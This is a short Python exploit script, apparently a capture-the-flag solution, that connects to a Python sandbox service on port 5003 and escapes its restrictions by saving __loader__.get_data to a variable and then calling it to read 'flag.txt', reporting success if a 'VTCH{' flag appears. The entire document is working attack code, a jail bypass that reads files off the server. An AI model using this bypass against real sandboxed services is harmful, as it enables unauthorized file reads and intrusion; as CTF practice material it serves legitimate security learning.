#!/usr/bin/env python3
import socket
import time
import sys

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = 5003
    
    print(f"[*] Connecting to {host}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    # Read greeting
    time.sleep(0.1)
    print(s.recv(1024).decode())
    
    # Send Command 1: Save getter function to d
    cmd1 = "d=__loader__.get_data\n"
    print(f"[*] Sending Command 1: {cmd1.strip()}")
    s.sendall(cmd1.encode())
    
    time.sleep(0.1)
    print(s.recv(1024).decode())
    
    # Send Command 2: Read and print the flag file
    cmd2 = 'print(d("flag.txt"))\n'
    print(f"[*] Sending Command 2: {cmd2.strip()}")
    s.sendall(cmd2.encode())
    
    time.sleep(0.1)
    response = s.recv(1024).decode()
    print(response)
    
    if "VTCH{" in response:
        print("[+] Exploit SUCCESSFUL!")
    else:
        print("[-] Exploit FAILED!")
        
    s.close()

if __name__ == "__main__":
    main()
